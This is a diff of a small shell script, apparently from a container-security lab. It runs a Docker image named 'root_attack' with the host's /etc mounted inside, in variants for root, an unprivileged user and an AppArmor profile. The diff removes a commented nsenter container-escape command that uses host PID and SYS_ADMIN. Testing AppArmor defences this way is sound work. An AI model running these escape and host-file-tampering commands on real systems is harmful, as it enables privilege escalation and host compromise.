@@ -1,8 +1,12 @@
 #!/bin/sh
 
 docker build . -t root_attack
+
+#root
 docker run --rm -it -v /etc:/etc root_attack
+#docker run --rm -it --security-opt "apparmor=root_attacker" -v /etc:/etc root_attack
 
-#docker run --rm -it --security-opt "apparmor=attacker_profile" --pid=host --cap-add SYS_PTRACE --cap-add SYS_ADMIN debian:latest nsenter -t 1 -m /bin/bash
-
+#user
+#docker run -u 555 --rm -it -v /etc:/etc root_attack
+#docker run -u 555 --rm -it --security-opt "apparmor=root_attacker" -v /etc:/etc root_attack
 
